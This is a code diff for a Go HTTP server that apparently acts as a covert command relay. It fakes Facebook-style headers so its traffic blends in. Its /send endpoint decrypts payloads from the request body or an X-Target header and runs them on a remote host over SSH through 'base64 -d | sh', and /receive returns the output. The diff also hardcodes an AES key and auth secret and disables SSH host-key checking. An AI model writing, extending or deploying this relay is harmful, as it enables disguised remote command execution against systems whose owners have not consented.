@@ -14,11 +14,11 @@ import (
     "os"
     "sync"
     "time"
-    
+
     "golang.org/x/crypto/ssh"
 )
 
-// Buffer manages per-client data with expiration
+// Buffer remains unchanged
 type Buffer struct {
     data map[string][]message
     mu   sync.RWMutex
@@ -94,27 +94,10 @@ func (b *Buffer) cleanup() {
 // AES Encryption
 var (
     buffer     = NewBuffer()
-    encryptKey []byte
-    authSecret string
-    sshClient  *ssh.Client
+    encryptKey = []byte("1234567890abcdef") // 16 bytes for AES-128
+    authSecret = "super_secret_auth"        // Simple shared auth secret
+    sshClient  *ssh.Client                  // Global SSH client
 )
-
-// Initialize at startup
-func init() {
-    // Read key from environment or use default
-    envKey := os.Getenv("ENCRYPTION_KEY")
-    if envKey != "" && len(envKey) >= 16 {
-        encryptKey = []byte(envKey)[:16]
-    } else {
-        encryptKey = []byte("default_key_12345") // Dev only!
-    }
-    
-    // Read auth secret
-    authSecret = os.Getenv("AUTH_SECRET")
-    if authSecret == "" {
-        authSecret = "dev_secret_987" // Dev only!
-    }
-}
 
 // Facebook-like random string generators
 func generateFacebookDebugID() string {
@@ -183,34 +166,44 @@ func addFacebookHeaders(w http.ResponseWriter) {
     w.Header().Set("Strict-Transport-Security", "max-age=15552000; preload")
 }
 
-// Establish SSH connection
-func connectToSSH() error {
+// Handlers remain mostly unchanged, but modified sendHandler below
+
+// SSH Initialization
+func initSSH() error {
     config := &ssh.ClientConfig{
         User: os.Getenv("SSH_USER"),
         Auth: []ssh.AuthMethod{
             ssh.Password(os.Getenv("SSH_PASSWORD")),
         },
-        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+        HostKeyCallback: ssh.InsecureIgnoreHostKey(), // For testing only!
         Timeout:         10 * time.Second,
+        Config: ssh.Config{
+            Compression: true, // Enable SSH compression
+        },
     }
 
-    client, err := ssh.Dial("tcp", os.Getenv("SSH_ADDR"), config)
+    conn, err := ssh.Dial("tcp", os.Getenv("SSH_ADDR"), config)
     if err != nil {
-        return err
+        return fmt.Errorf("failed to dial SSH: %w", err)
     }
-    sshClient = client
+    sshClient = conn
+    log.Println("SSH connection established")
     return nil
 }
 
-// Handlers
+// Modified sendHandler with SSH integration
 func sendHandler(w http.ResponseWriter, r *http.Request) {
     userAgent := r.Header.Get("User-Agent")
     hasFacebookUA := false
     
     if userAgent != "" {
-        hasFacebookUA = len(userAgent) > 20 && 
+        hasFacebookUA = (len(userAgent) > 20 && 
             (r.Header.Get("X-FB-HTTP-Engine") != "" || 
-             r.Header.Get("X-FB-Connection-Type") != "")
+             r.Header.Get("X-FB-Connection-Type") != ""))
+    }
+    
+    if r.Method != http.MethodPost {
+        log.Printf("Warning: Non-POST request to /send: %s", r.Method)
     }
     
     token := r.Header.Get("X-Token")
@@ -229,53 +222,81 @@ func sendHandler(w http.ResponseWriter, r *http.Request) {
     }
     
     var data []byte
-    maxSize := 1024 * 1024
-    r.Body = http.MaxBytesReader(w, r.Body, int64(maxSize))
-    encryptedData, err := io.ReadAll(r.Body)
-    if err != nil || len(encryptedData) == 0 {
-        addFacebookHeaders(w)
-        http.Error(w, `{"error": "Invalid request"}`, http.StatusBadRequest)
-        return
-    }
+    var err error
     
-    data, err = decrypt(encryptedData)
-    if err != nil {
-        decoded, decErr := base64.StdEncoding.DecodeString(string(encryptedData))
-        if decErr == nil && len(decoded) > aes.BlockSize {
-            data, err = decrypt(decoded)
-        }
+    target := r.Header.Get("X-Target")
+    if target != "" {
+        encryptedData, err := base64.StdEncoding.DecodeString(target)
         if err != nil {
+            addFacebookHeaders(w)
+            http.Error(w, `{"error": "Invalid payload format"}`, http.StatusBadRequest)
+            return
+        }
+        data, err = decrypt(encryptedData)
+        if err != nil {
+            addFacebookHeaders(w)
+            http.Error(w, `{"error": "Payload processing failed"}`, http.StatusBadRequest)
+            return
+        }
+    } else {
+        maxSize := 1024 * 1024
+        r.Body = http.MaxBytesReader(w, r.Body, int64(maxSize))
+        encryptedData, err := io.ReadAll(r.Body)
+        if err != nil {
+            addFacebookHeaders(w)
+            http.Error(w, `{"error": "Failed to read request body"}`, http.StatusBadRequest)
+            return
+        }
+        if len(encryptedData) == 0 {
+            addFacebookHeaders(w)
+            http.Error(w, `{"error": "Empty request body"}`, http.StatusBadRequest)
+            return
+        }
+        
+        if len(encryptedData) > aes.BlockSize {
+            data, err = decrypt(encryptedData)
+            if err != nil {
+                decoded, err := base64.StdEncoding.DecodeString(string(encryptedData))
+                if err == nil && len(decoded) > aes.BlockSize {
+                    data, err = decrypt(decoded)
+                }
+                if err != nil {
+                    data = encryptedData
+                }
+            }
+        } else {
             data = encryptedData
         }
     }
     
-    // Execute over SSH if connected
+    // Execute command over SSH
+    var cmdOutput []byte
+    
     if sshClient == nil {
-        if err := connectToSSH(); err != nil {
-            log.Printf("SSH connect failed: %v", err)
+        if err := initSSH(); err != nil {
+            log.Printf("SSH initialization failed: %v", err)
         }
     }
     
     if sshClient != nil {
         session, err := sshClient.NewSession()
         if err != nil {
-            log.Printf("SSH session failed: %v", err)
+            log.Printf("Failed to create SSH session: %v", err)
         } else {
             defer session.Close()
             
-            cmd := string(data)
-            output, err := session.CombinedOutput(cmd)
+            cmd := fmt.Sprintf("echo '%s' | base64 -d | sh 2>&1", base64.StdEncoding.EncodeToString(data))
+            cmdOutput, err = session.CombinedOutput(cmd)
             if err != nil {
-                log.Printf("SSH command error: %v", err)
-                output = []byte(fmt.Sprintf("Error: %v", err))
+                log.Printf("Command error: %v", err)
+                cmdOutput = []byte(fmt.Sprintf("Error: %v\nOutput: %s", err, cmdOutput))
             }
-            
-            buffer.Add(token, output)
         }
     } else {
-        // Fallback to local storage if SSH down
-        buffer.Add(token, data)
+        cmdOutput = append([]byte("SSH NOT CONNECTED:\n"), data...)
     }
+    
+    buffer.Add(token, cmdOutput)
     
     addFacebookHeaders(w)
     resp := map[string]interface{}{
@@ -291,9 +312,13 @@ func receiveHandler(w http.ResponseWriter, r *http.Request) {
     hasFacebookUA := false
     
     if userAgent != "" {
-        hasFacebookUA = len(userAgent) > 20 && 
+        hasFacebookUA = (len(userAgent) > 20 && 
             (r.Header.Get("X-FB-HTTP-Engine") != "" || 
-             r.Header.Get("X-FB-Connection-Type") != "")
+             r.Header.Get("X-FB-Connection-Type") != ""))
+    }
+    
+    if r.Method != http.MethodGet {
+        log.Printf("Warning: Non-GET request to /receive: %s", r.Method)
     }
     
     token := r.Header.Get("X-Token")
@@ -379,6 +404,17 @@ func rootHandler(w http.ResponseWriter, r *http.Request) {
 func main() {
     buffer.StartCleanupTask()
     
+    if envKey := os.Getenv("ENCRYPTION_KEY"); envKey != "" {
+        envKeyBytes := []byte(envKey)
+        if len(envKeyBytes) >= 16 {
+            encryptKey = envKeyBytes[:16]
+        }
+    }
+    
+    if envAuth := os.Getenv("AUTH_SECRET"); envAuth != "" {
+        authSecret = envAuth
+    }
+    
     // Set up routes
     mux := http.NewServeMux()
     mux.HandleFunc("/send", sendHandler)
@@ -390,6 +426,18 @@ func main() {
     if port == "" {
         port = "8080"
     }
+    
+    // Start SSH background reconnect task
+    go func() {
+        for {
+            if sshClient == nil {
+                if err := initSSH(); err != nil {
+                    log.Printf("SSH retry failed: %v", err)
+                }
+            }
+            time.Sleep(10 * time.Second)
+        }
+    }()
     
     log.Printf("Starting proxy on :%s", port)
     server := &http.Server{
